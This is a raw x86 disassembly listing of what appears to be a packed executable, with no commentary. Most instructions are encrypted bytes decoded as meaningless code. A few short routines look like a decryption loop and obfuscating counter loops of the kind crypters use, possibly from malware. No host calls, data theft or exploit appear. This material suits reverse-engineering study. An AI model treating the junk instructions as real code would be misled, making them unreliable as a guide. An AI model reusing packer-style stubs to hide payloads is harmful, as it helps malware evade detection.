  40317c:	pop    esp
  40317d:	stos   BYTE PTR es:[edi],al
  40317e:	sbb    al,0x3b
  403180:	fcom   DWORD PTR [esi]
  403182:	daa    
  403183:	jno    0x403164
  403185:	test   bl,dl
  403187:	dec    esi
  403188:	imul   esi,eax,0x2c434041
  40318e:	aaa    
  40318f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403190:	imul   ebx,esi,0x7
  403193:	fldenv ds:0xe8f9540d
  403199:	inc    ebx
  40319a:	sub    eax,edi
  40319c:	add    edx,DWORD PTR [edi+0x28d58bb1]
  4031a2:	out    0xab,eax
  4031a4:	pop    ss
  4031a5:	or     ch,BYTE PTR [edi+eiz*2]
  4031a8:	scas   eax,DWORD PTR es:[edi]
  4031a9:	sbb    DWORD PTR [esi+0x3c549c25],edx
  4031af:	bound  eax,QWORD PTR [edx+eax*1-0x6a]
  4031b3:	aaa    
  4031b4:	sbb    bh,dl
  4031b6:	inc    esi
  4031b7:	inc    ecx
  4031b8:	in     al,0x66
  4031ba:	mov    ebx,0x1016be73
  4031bf:	cmp    ebx,DWORD PTR [edx+0x24]
  4031c2:	sbb    al,0x17
  4031c4:	mov    ds:0x94116028,al
  4031c9:	mov    DWORD PTR [ebx-0x56],edi
  4031cc:	cli    
  4031cd:	mov    bh,0xe8
  4031cf:	data16 out dx,al
  4031d1:	dec    ecx
  4031d2:	cmc    
  4031d3:	mov    ah,BYTE PTR [edi-0x11]
  4031d6:	aaa    
  4031d7:	mov    esp,0xb37a5aa4
  4031dc:	adc    eax,0xad70ea99
  4031e1:	pop    edx
  4031e2:	and    BYTE PTR [ebx],al
  4031e4:	dec    esp
  4031e5:	data16 int3 
  4031e7:	ret    
  4031e8:	adc    edi,DWORD PTR [esi]
  4031ea:	xor    DWORD PTR [ebx+0x66],eax
  4031ed:	push   0xffffff8a
  4031ef:	pop    edx
  4031f0:	scas   al,BYTE PTR es:[edi]
  4031f1:	dec    ebp
  4031f2:	loope  0x403254
  4031f4:	fmul   DWORD PTR [ebx+0x54936cf2]
  4031fa:	xchg   edx,eax
  4031fb:	jg     0x40317e
  4031fd:	mov    ch,BYTE PTR [ecx+0x76]
  403200:	rol    DWORD PTR [ebx+0x3e77b01e],0x7a
  403207:	push   ds
  403208:	xchg   esi,eax
  403209:	es (bad) 
  40320b:	push   cs
  40320c:	mov    al,BYTE PTR ds:0x5e21b0cb
  403212:	pop    edx
  403213:	sti    
  403214:	jmp    0x6e0d5c4f
  403219:	xor    al,0xd9
  40321b:	js     0x4031dc
  40321d:	inc    edx
  40321e:	mov    esi,0x8786c0e2
  403223:	jmp    FWORD PTR [edi]
  403225:	lods   al,BYTE PTR ds:[esi]
  403226:	in     al,0xfb
  403228:	mov    ds:0x3f1021f1,al
  40322d:	mov    ah,0xc6
  40322f:	sbb    al,0x4b
  403231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403232:	and    eax,0x5d469253
  403237:	sbb    dl,BYTE PTR [edi+0x33469592]
  40323d:	or     al,0xd9
  40323f:	dec    esp
  403240:	into   
  403241:	ins    DWORD PTR es:[edi],dx
  403242:	mov    bh,0x82
  403244:	in     eax,0x8c
  403246:	adc    bl,BYTE PTR [edi+0x64]
  403249:	in     eax,dx
  40324a:	jmp    0xcdfe:0x28dc326f
  403251:	ins    DWORD PTR es:[edi],dx
  403252:	mov    esp,0x2b7ceb01
  403257:	stos   BYTE PTR es:[edi],al
  403258:	aam    0x35
  40325a:	mov    cl,0x25
  40325c:	sub    BYTE PTR [eax-0x79f07c25],dh
  403262:	mov    al,ds:0x3b82b18a
  403267:	rcl    DWORD PTR [eax+edi*2+0x513b5011],1
  40326e:	pop    edx
  40326f:	aam    0xd7
  403271:	mov    ebx,0xf97a0ece
  403276:	inc    edx
  403277:	sbb    eax,0x96f469a7
  40327c:	jb     0x403262
  40327e:	jecxz  0x40320e
  403280:	add    eax,0x12842509
  403285:	and    ebp,ebp
  403287:	ss lahf 
  403289:	(bad)
  40328d:	jnp    0x403295
  40328f:	shl    BYTE PTR [ebx+esi*1-0x14c02c5c],cl
  403296:	jp     0x403314
  403298:	sbb    al,0xba
  40329a:	or     eax,0xb0621297
  40329f:	or     ebx,DWORD PTR es:[edi+0x6146a90c]
  4032a6:	daa    
  4032a7:	int3   
  4032a8:	(bad)  
  4032a9:	sbb    edx,DWORD PTR [ebx-0x6209947b]
  4032af:	aam    0x28
  4032b1:	clc    
  4032b2:	loop   0x403311
  4032b4:	ss inc edi
  4032b6:	stos   BYTE PTR es:[edi],al
  4032b7:	std    
  4032b8:	retf   0x27b9
  4032bb:	mov    eax,0xef8fab95
  4032c0:	cmp    esp,DWORD PTR [ebx+0xc]
  4032c3:	pop    DWORD PTR [ebx+0x53]
  4032c6:	inc    edx
  4032c7:	mov    esp,0x1d137d11
  4032cc:	aad    0xb7
  4032ce:	les    edi,FWORD PTR [edx]
  4032d0:	xchg   edi,eax
  4032d1:	cmp    eax,0x7f932bb3
  4032d6:	push   ebx
  4032d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032d9:	mov    ebp,0x7495bc5c
  4032de:	mov    WORD PTR [ebx-0xee2c34e],ss
  4032e4:	adc    DWORD PTR [esi],0x7c
  4032e7:	jbe    0x4032d7
  4032e9:	jp     0x403323
  4032eb:	inc    edx
  4032ec:	daa    
  4032ed:	mov    edx,edx
  4032ef:	or     BYTE PTR [ebp+0x25],dh
  4032f2:	mov    ebp,0x92aa50ea
  4032f7:	mov    ebp,0x94f1d535
  4032fc:	shl    BYTE PTR [edi+0x5ade7dc8],0x5a
  403303:	stc    
  403304:	sub    eax,0xa1876ee0
  403309:	or     dh,al
  40330b:	das    
  40330c:	add    edi,DWORD PTR [ecx+0x1fd6e6de]
  403312:	mov    esp,0xa2a072c9
  403317:	test   eax,edi
  403319:	or     eax,0xbd749944
  40331e:	je     0x403362
  403320:	xchg   DWORD PTR [edi-0x5f0cbed0],edi
  403326:	inc    ebx
  403327:	ja     0x4032d5
  403329:	push   ebx
  40332a:	mov    bl,BYTE PTR [ebp-0x445648c]
  403330:	jns    0x403331
  403332:	or     BYTE PTR [ecx+eiz*2],0x87
  403336:	dec    esi
  403337:	adc    DWORD PTR [esi+edi*2-0x2c],esi
  40333b:	dec    ebx
  40333c:	sbb    ch,BYTE PTR [edx-0x22]
  40333f:	(bad)  
  403340:	jnp    0x4032f8
  403342:	add    eax,0x1578c2ec
  403347:	push   ebp
  403348:	(bad)  
  403349:	mov    bl,BYTE PTR [eax+eax*8-0x5b]
  40334d:	loope  0x403341
  40334f:	sub    DWORD PTR [edi+0x78469d32],edi
  403355:	add    al,0x14
  403357:	and    eax,edi
  403359:	sbb    eax,0xa54d6ec3
  40335e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40335f:	inc    esi
  403360:	popf   
  403361:	fstp   TBYTE PTR [ebp+esi*4+0x41]
  403365:	jns    0x403320
  403367:	es sub al,bh
  40336a:	pop    esi
  40336b:	inc    edi
  40336c:	pop    ss
  40336d:	pop    eax
  40336e:	adc    ecx,0xfffffffc
  403371:	outs   dx,BYTE PTR ds:[esi]
  403372:	je     0x4033bb
  403374:	and    DWORD PTR [ebp+ebx*4+0x55d49d7a],edi
  40337b:	imul   eax,DWORD PTR [ebx],0xe2ff6917
  403381:	add    dl,BYTE PTR [ebp-0x36]
  403384:	in     eax,0xf0
  403386:	mov    ebp,0x4e100267
  40338b:	fmul   DWORD PTR [eax]
  40338d:	rol    edi,1
  40338f:	pop    ss
  403390:	jp     0x4033ff
  403392:	sbb    al,BYTE PTR ds:0x6a2edee5
  403398:	cmp    DWORD PTR [ecx+ebp*2-0x75],0xaf0f0875
  4033a0:	cli    
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	or     ah,BYTE PTR [edx]
  4033bb:	inc    esp
  4033bc:	ja     0x4033f8
  4033be:	adc    al,0x70
  4033c0:	jo     0x403380
  4033c2:	jle    0x403434
  4033c4:	jo     0x403441
  4033c6:	(bad)  
  4033c7:	repnz xchg ebp,eax
  4033c9:	shl    DWORD PTR [edi],cl
  4033cb:	xor    dl,BYTE PTR [edi]
  4033cd:	and    dh,BYTE PTR [esi+0x4f]
  4033d0:	cmp    eax,0x5bd3a329
  4033d5:	ss sbb al,0xa6
  4033d8:	inc    ebp
  4033d9:	mov    WORD PTR [edx-0x18cc7724],fs
  4033df:	loopne 0x4033e0
  4033e1:	jle    0x4033d6
  4033e3:	(bad)  
  4033e5:	leave  
  4033e6:	iret   
  4033e7:	out    dx,al
  4033e8:	cld    
  4033e9:	dec    esp
  4033ea:	fisttp DWORD PTR [ecx]
  4033ec:	imul   ecx,edi,0x2f
  4033ef:	jmp    0xf007:0xd5cc08f1
  4033f6:	sub    DWORD PTR [eax-0x236c4044],ebp
  4033fc:	or     al,0x9c
  4033fe:	mov    edx,0xb9ab67b7
  403403:	iret   
  403404:	push   ebx
  403405:	int    0x84
  403407:	mov    edi,0x9fd35668
  40340c:	mov    dl,0xb7
  40340e:	mov    es,WORD PTR [ecx+0x47]
  403411:	fdivr  QWORD PTR [edx+edx*4-0x1]
  403415:	xor    BYTE PTR [ebx],dh
  403417:	inc    ebp
  403418:	pop    esi
  403419:	pop    esi
  40341a:	fwait
  40341b:	enter  0xd62a,0xdf
  40341f:	cmp    bl,BYTE PTR [edi-0x4275027f]
  403425:	jl     0x403457
  403427:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403428:	ret    0x1131
  40342b:	mov    cs,WORD PTR [edi-0xb6cf7c6]
  403431:	rcl    DWORD PTR ds:0xe2061fe4,1
  403437:	imul   ebp,DWORD PTR [ebx+eax*8],0xfffffff0
  40343b:	stos   DWORD PTR es:[edi],eax
  40343c:	push   ebx
  40343d:	aaa    
  40343e:	or     edi,DWORD PTR [edi+eax*8-0x4be057a6]
  403445:	xor    eax,0x5c011724
  40344a:	mov    al,0xcd
  40344c:	mov    eax,0x2d137d3f
  403451:	cwde   
  403452:	pop    edi
  403453:	repnz int3 
  403455:	test   DWORD PTR [ecx+0x44370ae2],0x68836779
  40345f:	ds dec ecx
  403461:	push   ss
  403462:	lea    edi,[edi-0x44]
  403465:	and    DWORD PTR [edi-0x18],esi
  403468:	push   esp
  403469:	outs   dx,BYTE PTR ds:[esi]
  40346a:	cmp    eax,0xd7562936
  40346f:	jae    0x4034b9
  403471:	pop    ss
  403472:	dec    esi
  403473:	es add eax,0x7888c8a1
  403479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40347a:	and    eax,0xeb96c517
  40347f:	fstp   QWORD PTR [edi-0x5576dd3f]
  403485:	adc    al,0x73
  403487:	aam    0xa8
  403489:	loopne 0x4034c8
  40348b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40348c:	xor    eax,0xf04976fb
  403491:	push   ebx
  403492:	ret    
  403493:	jbe    0x40343f
  403495:	ss loop 0x4034fc
  403498:	scas   eax,DWORD PTR es:[edi]
  403499:	mov    bh,0xa4
  40349b:	sbb    al,0xe0
  40349d:	dec    edi
  40349e:	mov    ebx,0x9c5d4b92
  4034a3:	xor    ecx,DWORD PTR [ecx-0x6eb8803c]
  4034a9:	ret    
  4034aa:	xor    al,0x5e
  4034ac:	mov    ds:0x6e1b05ff,al
  4034b1:	ret    0xe35d
  4034b4:	sub    al,BYTE PTR [esi-0x159c2ae7]
  4034ba:	es pop esi
  4034bc:	shr    DWORD PTR [esi+edi*1-0x60],0x1e
  4034c1:	xchg   ebp,eax
  4034c2:	call   0xd09a:0x174df0e9
  4034c9:	ja     0x403541
  4034cb:	sbb    al,0x6
  4034cd:	mov    esp,0x80e75089
  4034d2:	stos   BYTE PTR es:[edi],al
  4034d3:	shr    BYTE PTR [esi],1
  4034d5:	cmovbe esp,DWORD PTR [ecx]
  4034d8:	(bad)  
  4034d9:	dec    ebp
  4034da:	sub    eax,0x7ae56824
  4034df:	(bad)  
  4034e0:	push   0xffffffc7
  4034e2:	ss pop edi
  4034e4:	dec    edx
  4034e5:	test   eax,0x4e86a2b8
  4034ea:	xor    al,0xec
  4034ec:	cli    
  4034ed:	push   edx
  4034ee:	dec    BYTE PTR [ebp+0x66]
  4034f1:	sub    BYTE PTR ds:0xdc8406ce,ch
  4034f7:	dec    esi
  4034f8:	lock mov edx,0xc011269d
  4034fe:	mov    cl,0x18
  403500:	fnsave [eax+0x2fd9028c]
  403506:	sbb    eax,0x9a910e4
  40350b:	mov    ebp,0x66a6c370
  403510:	addr16 push 0x50
  403513:	mov    ds:0xfd948fde,al
  403518:	arpl   WORD PTR [ecx],si
  40351a:	mov    ch,dl
  40351c:	repnz adc esi,edx
  40351f:	mov    ds:0x7fdc91cd,al
  403524:	out    0x37,al
  403526:	lea    esp,[ecx]
  403528:	fs cli 
  40352a:	pop    ebx
  40352b:	jl     0x403563
  40352d:	out    dx,eax
  40352e:	sub    ecx,0x89ff9b5
  403534:	add    BYTE PTR [ecx+ebp*1-0x4b],bh
  403538:	cmp    bh,ch
  40353a:	or     al,BYTE PTR [edi+0x1b]
  40353d:	fisub  DWORD PTR [esi+ebx*4-0x3a6aacc7]
  403544:	sub    al,0x48
  403546:	or     eax,0x259ee942
  40354b:	add    DWORD PTR [edi],esi
  40354d:	aam    0xb
  40354f:	shr    BYTE PTR [ecx-0x1a],1
  403552:	jecxz  0x403593
  403554:	add    DWORD PTR [edx],ebp
  403556:	adc    BYTE PTR [eax+0x7],dh
  403559:	adc    al,0x34
  40355b:	(bad)  
  40355c:	xchg   esp,eax
  40355d:	mov    bl,ch
  40355f:	pop    es
  403560:	sahf   
  403561:	icebp  
  403562:	jo     0x403557
  403564:	lods   eax,DWORD PTR ds:[esi]
  403565:	mov    dl,0x64
  403567:	rcr    DWORD PTR [esi],cl
  403569:	das    
  40356a:	pushf  
  40356b:	adc    ecx,edx
  40356d:	not    BYTE PTR [ebx+eax*4]
  403570:	cdq    
  403571:	(bad)
  403575:	or     eax,0xfa7dac36
  40357a:	es leave 
  40357c:	cs pusha 
  40357e:	sub    al,0x79
  403580:	ja     0x40353c
  403582:	and    al,0xa2
  403584:	repnz out dx,al
  403586:	mov    ch,0xde
  403588:	cmp    eax,0x482cf304
  40358d:	repnz out 0xb7,eax
  403590:	pop    ds
  403591:	sbb    esp,0xffffff83
  403594:	xchg   ecx,ecx
  403596:	les    ecx,FWORD PTR [ebx-0x46ec0a0e]
  40359c:	test   cl,al
  40359e:	fld    DWORD PTR [ecx+0x1c51f53e]
  4035a4:	jbe    0x403548
  4035a6:	(bad)  
  4035a7:	push   edx
  4035a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035a9:	mov    BYTE PTR [edx],dl
  4035ab:	sub    eax,0x32746dc
  4035b0:	stos   BYTE PTR es:[edi],al
  4035b1:	sub    al,ch
  4035b3:	add    BYTE PTR [edx],cl
  4035b5:	pop    ecx
  4035b6:	xor    bl,dl
  4035b8:	mov    ah,0x1b
  4035ba:	sbb    al,0x23
  4035bc:	adc    BYTE PTR [edi-0x20bc86b2],bl
  4035c2:	leave  
  4035c3:	mov    dh,0xb5
  4035c6:	sub    DWORD PTR [edx],edx
  4035c8:	popa   
  4035c9:	int3   
  4035ca:	adc    ch,bl
  4035cc:	pop    ebx
  4035cd:	pop    esi
  4035ce:	ins    BYTE PTR es:[edi],dx
  4035cf:	jo     0x403623
  4035d1:	cmp    eax,0xc2e97df5
  4035d6:	(bad)  
  4035d7:	mov    es,WORD PTR [ebx+ebp*1+0x3]
  4035db:	repnz and DWORD PTR [ebp-0x945bc83],ebx
  4035e2:	dec    ecx
  4035e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035e4:	cld    
  4035e5:	mov    ecx,0x7f55a22d
  4035ea:	rol    BYTE PTR [eax],1
  4035ec:	sub    esi,esp
  4035ee:	sub    eax,esp
  4035f0:	xor    ah,BYTE PTR [edi]
  4035f2:	mov    WORD PTR [esp+ebp*4],cs
  4035f5:	cmp    DWORD PTR [ecx],edx
  4035f7:	mov    al,0x44
  4035f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035fa:	js     0x40358f
  4035fc:	js     0x40365b
  4035fe:	dec    ebp
  4035ff:	pop    ds
  403600:	adc    ebx,0x73
  403603:	ja     0x40363f
  403605:	scas   eax,DWORD PTR es:[edi]
  403606:	mov    BYTE PTR [bx],bh
  403609:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40360a:	(bad)  
  40360b:	out    dx,al
  40360c:	adc    eax,0x369ed688
  403611:	clc    
  403612:	out    0xa9,eax
  403614:	(bad)  
  403615:	mov    edx,0xa42c8e94
  40361a:	or     ecx,DWORD PTR [ebx-0x6d]
  40361d:	(bad)  
  40361e:	nop
  40361f:	dec    edi
  403620:	lods   eax,DWORD PTR ds:[esi]
  403621:	fdiv   QWORD PTR [ebx]
  403623:	outs   dx,DWORD PTR ds:[esi]
  403624:	jmp    0x4035eb
  403626:	(bad)  
  403627:	fwait
  403628:	loopne 0x40360a
  40362a:	sub    al,bh
  40362c:	loop   0x40365a
  40362e:	fxch   st(1)
  403630:	es out dx,eax
  403632:	jle    0x4035b4
  403634:	pop    edi
  403635:	pop    edi
  403636:	pop    ebx
  403637:	mov    bl,0x36
  403639:	ds aas 
  40363b:	push   es
  40363c:	lods   eax,DWORD PTR ds:[esi]
  40363d:	daa    
  40363e:	inc    edx
  40363f:	dec    esi
  403640:	(bad)  
  403641:	dec    edx
  403642:	xor    eax,DWORD PTR [ebp-0xe]
  403645:	mov    ecx,0x1baaf7c1
  40364a:	mov    ecx,0xf918ff8
  40364f:	adc    al,0xaa
  403651:	(bad)  [ecx+eax*2-0x56c122aa]
  403658:	and    ecx,esp
  40365a:	fistp  DWORD PTR [edi-0x5e85cd98]
  403660:	dec    edi
  403661:	mov    al,fs:0x764cf095
  403667:	fisub  DWORD PTR [edx-0x4c]
  40366a:	cwde   
  40366b:	loopne 0x4036e3
  40366d:	arpl   WORD PTR [edx+0x4359f37e],cx
  403673:	inc    eax
  403674:	shl    BYTE PTR [ecx],1
  403676:	pusha  
  403677:	and    DWORD PTR [esi-0x29af004],eax
  40367d:	cmp    esi,DWORD PTR cs:[ebx]
  403680:	ret    
  403681:	ja     0x403648
  403683:	inc    ecx
  403684:	cli    
  403685:	leave  
  403686:	xchg   DWORD PTR [edx+0x729c0384],ecx
  40368c:	xor    al,BYTE PTR [eax]
  40368e:	mov    BYTE PTR [edi+esi*1],al
  403691:	mov    eax,DWORD PTR [ebp-0x4]
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fced,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fced,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fced,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e2d7
  4036fc:	cmp    DWORD PTR ds:0x42fced,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fced
  403711:	dec    eax
  403712:	mov    ds:0x42fced,eax
  403717:	mov    eax,ds:0x42fced
  40371c:	dec    eax
  40371d:	mov    ds:0x42fced,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e6f3,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e6f7,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fd0d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e713,0x42e11c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fd7a,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e124,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e70f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    DWORD PTR [esi],ecx
  4037a2:	jnp    0x40376f
  4037a4:	pop    eax
  4037a5:	js     0x4037b8
  4037a7:	jo     0x403819
  4037a9:	cmp    eax,0x8370707d
  4037ae:	mov    edx,0xa6ab3b6b
  4037b3:	vpminsw ymm0,ymm7,YMMWORD PTR [ecx+0x24df095e]
  4037bb:	pop    ebx
  4037bc:	lods   al,BYTE PTR ds:[esi]
  4037bd:	mov    esi,0x2952b87b
  4037c2:	pop    es
  4037c3:	jp     0x403824
  4037c5:	arpl   WORD PTR [ecx-0x5d],bp
  4037c8:	dec    esp
  4037c9:	xchg   ebx,eax
  4037ca:	cmp    dl,BYTE PTR [ebp+0x2f]
  4037cd:	or     bh,ch
  4037cf:	cmp    ah,ah
  4037d1:	sar    BYTE PTR [ebx],1
  4037d3:	movzx  ecx,BYTE PTR [edx+esi*4+0xe7fdc2e]
  4037db:	daa    
  4037dc:	inc    edx
  4037dd:	or     bh,bl
  4037df:	xchg   ecx,eax
  4037e0:	jb     0x40381f
  4037e2:	jmp    0xf9a:0xfaabaecc
  4037e9:	sub    eax,0xebbac03b
  4037ee:	push   esi
  4037ef:	das    
  4037f0:	scas   eax,DWORD PTR es:[edi]
  4037f1:	stos   DWORD PTR es:[edi],eax
  4037f2:	sub    ebp,ecx
  4037f4:	inc    edx
  4037f5:	inc    edi
  4037f6:	ja     0x40378c
  4037f8:	(bad)  
  4037f9:	lock (bad) 
  4037fd:	cmc    
  4037fe:	mov    edx,fs
  403800:	adc    bl,BYTE PTR [ecx+esi*8+0x1501dfe5]
  403807:	adc    BYTE PTR [edx+edi*1+0x3a6dc029],cl
  40380e:	std    
  40380f:	call   0xe1503f13
  403814:	sub    edx,DWORD PTR [ebp-0x72]
  403817:	les    esi,FWORD PTR [ecx-0x3058c8d7]
  40381d:	push   es
  40381e:	mov    ds:0xc145c5ce,al
  403823:	adc    eax,0xb14a4514
  403828:	aaa    
  403829:	ret    
  40382a:	cli    
  40382b:	sbb    eax,0x8ae1468a
  403830:	pop    ss
  403831:	retf   
  403832:	xor    ah,BYTE PTR [esp+eax*1]
  403835:	jmp    0x40385e
  403837:	int    0xb3
  403839:	stc    
  40383a:	sub    dl,BYTE PTR [ecx-0x3863b2c8]
  403840:	inc    ebx
  403841:	push   cs
  403842:	push   0x1b42bb4c
  403847:	cmp    eax,0xfaed10b5
  40384c:	lods   al,BYTE PTR ds:[esi]
  40384d:	ja     0x403831
  40384f:	sub    BYTE PTR [edi+esi*8-0x27],bl
  403853:	xor    al,BYTE PTR [eax-0x31]
  403856:	mov    ah,0x80
  403858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403859:	iret   
  40385a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40385b:	fmul   st,st(7)
  40385d:	dec    edx
  40385e:	sbb    BYTE PTR [ebp-0x73a768df],al
  403864:	sub    al,0x3c
  403866:	aad    0x5f
  403868:	fdivr  st(2),st
  40386a:	(bad)  
  40386b:	retf   
  40386c:	ret    0x40d5
  40386f:	(bad)  
  403870:	loop   0x40388f
  403872:	out    dx,al
  403873:	push   0xf06a851b
  403878:	lock and ch,BYTE PTR [ecx+0x55]
  40387c:	xchg   edx,eax
  40387d:	mov    ah,0x2f
  40387f:	dec    edx
  403880:	mov    eax,ds:0x73c1345b
  403885:	xchg   edi,eax
  403886:	push   edi
  403887:	es inc ebp
  403889:	mov    bl,0x51
  40388b:	or     cl,dl
  40388d:	mov    ds:0x517c3a5d,eax
  403892:	fist   DWORD PTR [ebp+0x702d0607]
  403898:	outs   dx,BYTE PTR ds:[esi]
  403899:	sub    esi,ebp
  40389b:	call   0xf5422312
  4038a0:	cli    
  4038a1:	or     DWORD PTR [eax-0xa3206f5],eax
  4038a7:	rol    DWORD PTR [edi-0x60],1
  4038aa:	mov    bl,0x9d
  4038ac:	xchg   edx,ebp
  4038ae:	dec    ecx
  4038af:	les    edi,FWORD PTR [edx+ebp*2-0x70aa3c40]
  4038b6:	mov    esp,0xe9097518
  4038bb:	mov    DWORD PTR ds:0x682fbb9d,ebx
  4038c1:	cmp    ebx,DWORD PTR [ecx-0x6595c46]
  4038c7:	sub    BYTE PTR [edi],0x1e
  4038ca:	test   eax,0x385fdd8b
  4038cf:	sbb    dh,BYTE PTR ds:[ebp+0x1c]
  4038d3:	adc    ax,0xf46c
  4038d7:	(bad)  
  4038d8:	punpcklbw mm7,mm7
  4038db:	nop
  4038dc:	lods   eax,DWORD PTR ds:[esi]
  4038dd:	sub    bl,BYTE PTR [ebx]
  4038df:	loop   0x40392a
  4038e1:	popa   
  4038e2:	or     eax,0x99db7b41
  4038e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038e8:	fst    DWORD PTR [esi]
  4038ea:	ja     0x403877
  4038ec:	imul   edi,DWORD PTR [edi-0x62],0x14
  4038f0:	mov    eax,0xc57922ae
  4038f5:	push   ds
  4038f6:	push   ebp
  4038f7:	packssdw mm3,QWORD PTR [esi-0x46da5a15]
  4038fe:	jne    0x4038de
  403900:	sahf   
  403901:	mov    edx,0x1415f58e
  403906:	lods   al,BYTE PTR ds:[esi]
  403907:	xchg   ebp,eax
  403908:	adc    eax,0xab943fc1
  40390d:	or     BYTE PTR [ebx-0x7b],ch
  403910:	mov    ah,0xed
  403912:	or     ebp,DWORD PTR [ebx+0x541d0dfc]
  403918:	push   0x579f98e5
  40391d:	scas   eax,DWORD PTR es:[edi]
  40391e:	bound  ebp,QWORD PTR [edi+0x597850fa]
  403924:	dec    ebp
  403925:	cmp    eax,0x2941726e
  40392a:	in     eax,dx
  40392b:	jbe    0x40390f
  40392d:	sar    BYTE PTR [esi-0x21],cl
  403930:	add    dh,ch
  403932:	jmp    0x4039b3
  403934:	imul   esi,ecx,0x67
  403937:	mov    ch,0x96
  403939:	loope  0x403979
  40393b:	adc    BYTE PTR [edx+0x4b],0x31
  40393f:	and    BYTE PTR [ecx],bh
  403941:	pop    ecx
  403942:	add    BYTE PTR [esi+0x46],0x7a
  403946:	ins    DWORD PTR es:[edi],dx
  403947:	inc    ebp
  403948:	aam    0x7e
  40394a:	pushf  
  40394b:	and    DWORD PTR [ebx],eax
  40394d:	sub    BYTE PTR [ecx],al
  40394f:	dec    esp
  403950:	(bad)  
  403951:	popf   
  403952:	je     0x4038e6
  403954:	pushf  
  403955:	push   edi
  403956:	test   al,0x11
  403958:	inc    edx
  403959:	cmp    eax,0xb0d5dfa4
  40395e:	stos   BYTE PTR es:[edi],al
  40395f:	int    0x18
  403961:	ror    DWORD PTR [ebp-0x76f7e25a],1
  403967:	ja     0x4039a9
  403969:	in     al,dx
  40396a:	add    DWORD PTR [ecx],0x5
  40396d:	loope  0x4039c7
  40396f:	(bad)  
  403971:	xor    edx,DWORD PTR [ecx+0x1202939f]
  403977:	retf   0x2e10
  40397a:	mov    eax,ds:0x716d4bc
  40397f:	mov    al,0x5
  403981:	mov    ch,0x70
  403983:	add    eax,0x9aee43d8
  403988:	mov    ch,0x90
  40398a:	(bad)  
  40398b:	xor    esp,DWORD PTR [edi+ecx*8-0x126570ef]
  403992:	hlt    
  403993:	mov    DWORD PTR ds:0x3e07,esp
  403998:	repz pop esp
  40399a:	xor    ebx,eax
  40399c:	add    BYTE PTR [esp+esi*1-0x4892ee6b],0xd4
  4039a4:	outs   dx,DWORD PTR ds:[esi]
  4039a5:	rcl    BYTE PTR [edx],0x31
  4039a8:	mov    dh,0xb7
  4039aa:	repnz or al,0x56
  4039ad:	cmp    DWORD PTR [ecx],ebp
  4039af:	inc    ebp
  4039b0:	adc    ebp,DWORD PTR [ebx+ebx*8]
  4039b3:	outs   dx,DWORD PTR ds:[esi]
  4039b4:	out    0xab,eax
  4039b6:	sbb    BYTE PTR [edx-0x30],0x35
  4039ba:	mov    edi,0x7db9da5a
  4039bf:	push   edi
  4039c0:	les    ebp,FWORD PTR [edi-0x787f01fd]
  4039c6:	xlat   BYTE PTR ds:[ebx]
  4039c7:	dec    esp
  4039c8:	push   esp
  4039c9:	mov    edi,0x7e510b18
  4039ce:	cmp    al,0x1d
  4039d0:	xchg   ecx,eax
  4039d1:	lds    esp,FWORD PTR [ebp-0x28]
